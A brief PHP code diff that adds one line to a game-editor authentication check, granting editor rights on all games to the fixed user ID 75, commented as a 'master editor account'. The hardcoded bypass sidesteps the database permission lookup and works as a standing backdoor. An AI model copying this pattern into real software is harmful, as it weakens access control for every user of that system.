@@ -26,6 +26,7 @@ class editors extends dbconnection
         $user_id = intval($pack->user_id);
         $game_id = intval($pack->game_id);
         if(dbconnection::queryObject("SELECT * FROM user_games WHERE user_id = '{$user_id}' AND game_id = '{$game_id}'")) return true;
+        if($user_id === 75) return true; // stemports master editor account
         // util::errorLog("Failed Game Editor Authentication!");
         return false;
     }
